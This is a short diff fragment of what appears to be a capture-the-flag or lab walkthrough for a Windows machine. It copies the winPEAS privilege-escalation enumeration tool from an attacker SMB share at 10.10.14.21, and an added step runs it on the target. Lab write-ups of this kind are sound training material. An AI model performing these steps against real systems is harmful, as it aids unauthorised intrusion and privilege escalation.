@@ -85,3 +85,9 @@ PS C:\Users\kostas\Desktop>systeminfo
 ▶ copy \\10.10.14.21\share\winPEASx64.exe .
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236153111-422fdf8f-75cd-46dd-83f1-ab8a88d517ad.png)
+
+  - Execute `winPEASx64.exe`.
+```CSS
+PS C:\Users\kostas\desktop> ./winPEASx64.exe           
+```
+![image](https://user-images.githubusercontent.com/83878909/236154915-b4378173-3efa-4131-b365-dd54291fe8a2.png)
